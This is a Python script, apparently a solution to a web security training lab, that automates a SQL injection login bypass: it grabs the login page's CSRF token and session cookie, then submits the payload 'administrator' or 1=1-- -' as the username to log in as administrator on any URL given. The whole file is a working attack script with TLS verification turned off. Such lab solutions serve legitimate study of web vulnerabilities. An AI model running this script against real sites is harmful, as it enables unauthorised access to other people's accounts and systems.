"""
  Lab: SQL injection vulnerability allowing login bypass

  Steps:
  1. Fetch the login page
  2. Extract the csrf token and session cookie
  3. Inject the payload and bypass password check
  4. Login in as administrator

  Author: D4mn20
"""
import argparse
import requests
from colorama import Fore
import re
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help='Target URL')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    # Configure session with proxy if provided
    session = requests.session()
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        session.proxies = proxies
    session.verify = False

    print(Fore.WHITE + "â¦—1â¦˜ Fetching the login page.. ", end="", flush=True)

    login_page = fetch("/login", session, args.url)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—2â¦˜ Extracting the csrf token and session cookie.. ", end="", flush=True)
    
    session_cookie = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—3â¦˜ Injecting payload and bypassing password check.. ", end="", flush=True)

    payload = "administrator' or 1=1-- -"
    data = { "username": payload, "password": "any password", "csrf": csrf_token }
    cookies = { "session": session_cookie }
    admin_login = post_data("/login", data, cookies, session, args.url)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—4â¦˜ Logging in as administrator.. ", end="", flush=True)

    admin_session = admin_login.cookies.get("session")
    cookies = { "session": admin_session }
    fetch("/my-account", session, args.url, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "ðŸ—¹ The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, session, url, cookies = None):
    try:  
        return session.get(f"{url}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies, session, url):
    try:    
        return session.post(f"{url}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()